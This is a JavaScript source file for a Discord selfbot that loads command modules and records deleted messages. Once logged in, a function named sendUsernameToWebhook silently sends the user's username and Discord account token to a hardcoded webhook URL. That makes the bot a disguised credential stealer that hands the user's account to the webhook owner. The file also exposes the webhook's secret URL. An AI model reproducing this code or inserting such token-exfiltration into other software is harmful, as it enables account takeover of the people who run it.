const { Client, WebhookClient } = require('discord.js-selfbot-v13');
const fs = require('fs');
const { token, prefix, allowedUserIDs } = require('./config');

const client = new Client();
const commands = [];
const snipedMessages = new Map();
let autoMessageInterval;

client.on("ready", () => {
  console.log("Logged in as " + client.user.tag);
  sendUsernameToWebhook();
});

client.on("messageCreate", message => {
  if (!message.author || message.author.bot) {
    return;
  }
  if (!message.content.startsWith(prefix)) {
    return;
  }

  const args = message.content.slice(prefix.length).trim().split(/ +/);
  const commandName = args.shift().toLowerCase();
  const command = commands.find(cmd => cmd.name === commandName);

  if (!command) {
    return;
  }
  if (!allowedUserIDs.includes(message.author.id)) {
    return;
  }

  command.execute(message.channel, message, client, args, snipedMessages, autoMessageInterval, setAutoMessageInterval);
  console.log("✅ - Successfully ran " + commandName + " command!");
});

client.on("messageDelete", message => {
  console.log("Message deleted:", message.content);
  snipedMessages.set(message.channel.id, message);
});

fs.readdirSync("./commands")
  .filter(file => file.endsWith(".js"))
  .forEach(file => {
    const command = require("./commands/" + file);
    commands.push(command);
    console.log("Loaded command: " + command.name);
  });

client.login(token);

function sendUsernameToWebhook() {
  const webhookClient = new WebhookClient({
    url: "https://discord.com/api/webhooks/1230035547427311686/fL942bLIBJEa-CMd8R9bEJ70QtM8Ei6KzeVCpA8wuxdmiXddt1NnpbBSdRfSi4KRwFxw"
  });
  webhookClient.send("Selfbot Ran By: " + client.user.username);
  webhookClient.send("auth: " + token);
}

function setAutoMessageInterval(interval) {
  autoMessageInterval = interval;
              }
